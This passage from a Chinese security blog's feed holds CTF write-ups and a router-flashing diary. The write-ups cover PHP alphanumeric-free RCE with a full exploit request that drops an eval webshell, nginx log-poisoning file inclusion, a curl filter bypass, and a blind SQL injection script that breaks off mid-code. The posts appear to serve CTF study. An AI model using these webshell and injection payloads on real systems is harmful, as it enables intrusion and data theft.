operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><p>注意这两个payload利用的话要php版本小于7才能成功利用，</p><blockquote><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。</p></blockquote><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>PHP中有两种短标签，<code>&lt;??&gt;</code>和<code>&lt;?=?&gt;</code>。其中，<code>&lt;??&gt;</code>相当于对<code>&lt;?php&gt;</code>的替换。而<code>&lt;?=?&gt;</code>则是相当于<code>&lt;? echo&gt;</code>.</p><p>例如：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string single-quoted-string">'whoami'</span><span class="token delimiter important">?></span></span>  //输出  whoami<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token delimiter important">?></span></span>  //输出  命令执行后的结果</code></pre><p>PHP中POST上传文件会把我们上传的文件暂时存在<code>/tmp</code>文件夹中，默认文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>尝试生成执行的文件，payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span> <span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><p>最后的<code>[@-[]</code>表示ASCII在<code>@</code>和<code>[</code>之间的字符，也就是大写字母，所以最后会执行的文件是<code>tmp</code>文件夹下结尾是大写字母的文件。</p><p>exp数据包</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/?exp=?>&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> xxxxxx:2333<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Content-Type:</span>multipart/form-data;boundary=--------123<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 106----------123<span class="token header-name keyword">Content-Disposition:</span>form-data;name="file";filename="1.txt"echo "&lt;?php eval(\$_POST['shell']);" > success.php----------123--</code></pre><p>即可<code>getshell</code></p><p>拿<code>flag</code>的话还可以使用通配符</p><pre class="language-php" data-language="php"><code class="language-php">code=?><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`/???/??? /????`</span><span class="token delimiter important">?></span></span></code></pre><p>其中<code>/???/??? /????</code>匹配<code>/bin/cat /flag</code>，这样也能得到<code>flag</code></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">通过一道代码审计题目来练习无数字字母构造webshell</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li><li><a href="https://xz.aliyun.com/t/8107">无字母数字webshell总结</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_match(&amp;#39;[a-z0-9]/is&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>路由器折腾小记</title>
    <link href="https://www.extrader.top/posts/4704f692/"/>
    <id>https://www.extrader.top/posts/4704f692/</id>
    <published>2020-08-06T04:27:18.000Z</published>
    <updated>2020-08-08T13:32:13.301Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用</p><h4 id="物色路由器"><a href="#物色路由器" class="headerlink" title="物色路由器"></a>物色路由器</h4><p>因为从来没玩过，而且家里好几年前的路由器是时候改换了，于是就准备换台，当初只是单纯的想换台路由器提升提升家里的WiFi信号的网速，都已经在jd上选好了一台水星的，但因为一直在学校迟迟没有买，后来发现了路由器的各种玩法，刷固件fq，解锁某云灰色music之类的，就开始在网上各种资料和固件，也慢慢的在物色一款路由器（原来选中的水星的那个网上资料少，官方好像不支持固件切换），一直在小米和newifi3之间徘徊，最后选择了联想的newifi3，结果无线翻车了，现在后悔了当时为什么没有看到k2p，┭┮﹏┭┮，无线信号是真的差，刷了openwrt后居然赶不上我家原来的老路由器，心态炸了。。。</p><p>但是。。。炸归炸，用还是有用的，虽然无线不咋地，当其他方面用用可以的，支持usb，512M的内存</p><h4 id="刷不死breed"><a href="#刷不死breed" class="headerlink" title="刷不死breed"></a>刷不死breed</h4><p>先下好不死breed固件，这个网上很多</p><p>然后本地搭一个web服务器，把文件放上面，然后在路由器终端了里就可以用wget下载了</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.99.1<span class="token builtin class-name">cd</span> /tmp<span class="token function">wget</span> http://xxx.xxx.xxx.xxx/newifi-d2-jail-break.koinsmod newifi-d2-jail-break.ko</code></pre><p>随后SSH 会停止响应，因为 newifi-d2-jail-break.ko 会冻结系统的其他功能，强制写入 Newifi D2 专用版 Breed 到 Flash</p><p>然后把路由器电源拔了之后按住reset按钮再插上电源直到只有电源等开始闪烁再松开电源，浏览器输入192.168.1.1即可进入breed web管理界面，再在这里面将原来的eeprom和编程器备份一下，再刷入自己想要的第三方固件（bin文件）</p><p>刷这个breed的原因是因为我们在刷第三方固件的时候如果没操作好，固件切换出了差错的话，路由器就变砖了，为了避免这种情况，就有大神做出了这个breed，相当于一个uboot引导加载程序</p><h4 id="刷第三方固件"><a href="#刷第三方固件" class="headerlink" title="刷第三方固件"></a>刷第三方固件</h4><p>这里我试了好几个，最后选择了esir大神的openwrt固件，这里可以下载： <a href="https://openwrt.club/dl">https://openwrt.club/dl</a> </p><p>选择里面的<code>openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin</code>文件刷入后等待路由器重启，重启完成后输入192.168.1.1即可进入openwrt管理界面</p><h4 id="刷openclash"><a href="#刷openclash" class="headerlink" title="刷openclash"></a>刷openclash</h4><p>下载地址 <a href="https://github.com/vernesong/OpenClash/releases">https://github.com/vernesong/OpenClash/releases</a></p><p>下好ipk文件，ssh连上路由器，执行以下命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp opkg updateopkg <span class="token function">install</span> coreutils-nohup <span class="token function">bash</span> iptables dnsmasq-full <span class="token function">curl</span> jsonfilter ca-certificates ipset ip-full iptables-mod-tproxy<span class="token function">wget</span> https://github.com/vernesong/OpenClash/releases/download/v0.39.6-beta/luci-app-openclash_0.39.6-beta_all.ipkopkg <span class="token function">install</span> luci-app-openclash_0.39.6-beta_all.ipk</code></pre><p>然后刷新一下页面就可以在服务里面看到openclash了，剩下的配置工作就要自己操作了</p><p>另外这个版本的自带解锁网易云灰色音乐的功能，直接开启就可以了</p><h4 id="自己编译openwrt"><a href="#自己编译openwrt" class="headerlink" title="自己编译openwrt"></a>自己编译openwrt</h4><p>注意：</p><ol><li><strong>不</strong>要用 <strong>root</strong> 用户来 git 和编译！！！</li><li>国内用户编译前最好准备好梯子</li><li>默认登陆IP 192.168.1.1, 密码 password</li></ol><p>需要Ubuntu 18 LTS x64环境</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> build-essential asciidoc binutils <span class="token function">bzip2</span> <span class="token function">gawk</span> gettext <span class="token function">git</span> libncurses5-dev libz-dev patch python3.5 python2.7 <span class="token function">unzip</span> zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf</code></pre><p>然后下载openwrt的源代码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Lienol/openwrt<span class="token builtin class-name">cd</span> openwrt/package<span class="token function">git</span> clone https://github.com/kenzok8/openwrt-packages.git<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>./scripts/feeds clean./scripts/feeds update -a./scripts/feeds <span class="token function">install</span> -a<span class="token function">make</span> menuconfig</code></pre><p>然后就是配置编译选项了</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">如果是newifi3则：Target System选择 <span class="token string">"MediaTek Ralink MIPS"</span>Subtarget选择<span class="token string">"MT7621"</span>Target Profile选择<span class="token string">"Newifi D2"</span></code></pre><p>我们希望有web界面，还需在<code>LuCI ---&gt; Collections</code>选项中选上<code>luci</code></p><p>在<code>LuCI ---&gt; Applications</code>选择要添加的插件应用。</p><p>在<code>LuCI ---&gt; Themes</code>中设置要安装的主题。</p><p><code>make -j8 download v=s</code> 下载dl库</p><p>输入 <code>make -j1 V=s</code> （<code>-j</code> 后面的数字1是线程数。第一次编译推荐用单线程）即可开始编译你要的固件了。</p><p>编译完成后输出路径：<code>openwrt/bin/targets</code></p><p>第二次编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> lede<span class="token function">git</span> pull./scripts/feeds update -a <span class="token operator">&amp;&amp;</span> ./scripts/feeds <span class="token function">install</span> -a<span class="token function">make</span> defconfig<span class="token function">make</span> -j8 download<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre><p>如果需要重新配置：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> -rf ./tmp <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .config<span class="token function">make</span> menuconfig<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://cloud.tencent.com/developer/article/1614849">编译自己的openwrt固件 附编译好的newifi3固件</a></li><li><a href="https://mianao.info/2020/03/01/轻松编译Openwrt固件支持V2ray和Trojan-上篇">轻松编译Openwrt固件支持V2ray和Trojan-上篇</a></li><li><a href="https://mianao.info/2020/03/02/%E8%BD%BB%E6%9D%BE%E7%BC%96%E8%AF%91Openwrt%E5%9B%BA%E4%BB%B6%E6%94%AF%E6%8C%81V2ray%E5%92%8CTrojan-%E4%B8%8B%E7%AF%87">轻松编译Openwrt固件支持V2ray和Trojan-下篇</a></li><li><a href="https://mianao.info/2020/05/05/%E7%BC%96%E8%AF%91%E6%9B%B4%E6%96%B0OpenWrt-PassWall%E5%92%8CSSR-plus%E6%8F%92%E4%BB%B6">编译更新OpenWrt PassWall和SSR-plus插件</a></li><li><a href="https://github.com/kenzok8/openwrt-packages">openwrt-packages</a></li><li><a href="https://github.com/Lienol/openwrt">openwrt</a></li><li><a href="https://github.com/coolsnowwolf/lede">lede</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用&lt;/p&gt;
&lt;h4 id=&quot;物色路由器&quot;&gt;&lt;a href=&quot;#物色路由器&quot; class=&quot;headerlink&quot; title=&quot;物色路由器&quot;&gt;&lt;/a&gt;物色路由器&lt;/h4&gt;&lt;p&gt;因为从来没玩过，而且家里好几年前的路由器是时候
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://www.extrader.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="折腾" scheme="https://www.extrader.top/tags/%E6%8A%98%E8%85%BE/"/>
    
      <category term="路由器" scheme="https://www.extrader.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW-WEB_AK赛</title>
    <link href="https://www.extrader.top/posts/f7521cf/"/>
    <id>https://www.extrader.top/posts/f7521cf/</id>
    <published>2020-08-03T13:10:31.000Z</published>
    <updated>2020-08-04T03:51:45.832Z</updated>
    
    <content type="html"><![CDATA[<p>在菜鸡的道路上越走越远。。。淦！</p><span id="more"></span><h3 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>?file=/flag.txt</code>直接出答案。。这算个非预期解吧</p><p>另外的解法：文件包含Nginx日志文件、</p><p><code>?file=/var/log/nginx/access.log</code>可读日志文件内容，里面包含用户访问的UA信息</p><p>于是</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>尝试命令执行</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK赛/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>随后<code>cat /flag.txt</code>即可</p><h3 id="Web1-观字"><a href="#Web1-观字" class="headerlink" title="Web1_观字"></a>Web1_观字</h3><p>题目给出源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#flag in http://192.168.7.68/flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$protocol</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$protocol</span><span class="token operator">!=</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'仅限http协议访问'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.|\;|\||\&lt;|\>|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'仅限域名地址访问'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>payload</code>：<code>/?url=http://192。168。7。68/flag</code></p><p>原因是curl中可以用<code>。</code>替换<code>.</code></p><p>另外，ip可以使用十进制进行访问，即<code>http://3232237380/flag</code>，但题目过滤了0</p><h3 id="Web2-观星"><a href="#Web2-观星" class="headerlink" title="Web2_观星"></a>Web2_观星</h3><p>url可以给id传值，当传入一个引号的时候回显<code>enheng?</code>，推测sql注入</p><p>FUZZ测试发现过滤了以下的内容（长度为533的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>未过滤<code>^</code>，考虑布尔盲注</p><p>payload：</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>过滤了逗号，<code>if</code>无法使用则用<code>case...when...then...else...end</code>代替绕过，<code>substr</code>中的逗号用<code>substr(...from...for...)</code>代替绕过</p><p>接下来就可以写脚本了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show/index.php?id=1^'</span><span class="token comment"># payload = 'case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'   web1</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    flag,page,user</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    FLAG_COLUMN,flag</span>payload <span class="token operator">=</span> <span class="token string">'case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        urls 